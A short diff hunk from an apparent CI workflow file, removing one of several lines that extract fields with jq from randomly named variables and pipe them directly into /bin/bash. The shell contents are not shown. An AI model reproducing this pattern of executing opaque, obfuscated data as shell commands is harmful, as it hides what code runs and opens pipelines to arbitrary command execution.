@@ -24,7 +24,6 @@ jobs:
           echo $hmmki4 | jq -r .vt2 | /bin/bash
           echo $sqlpk522 | jq -r .alqrx24 | /bin/bash
           echo $nsyu43732 | jq -r .wwr3464 | /bin/bash
-          echo $zunn06 | jq -r .wop2060 | /bin/bash
           printf '%s' "$iii038" | jq -r .so9 | /bin/bash
 
       - name: Save output
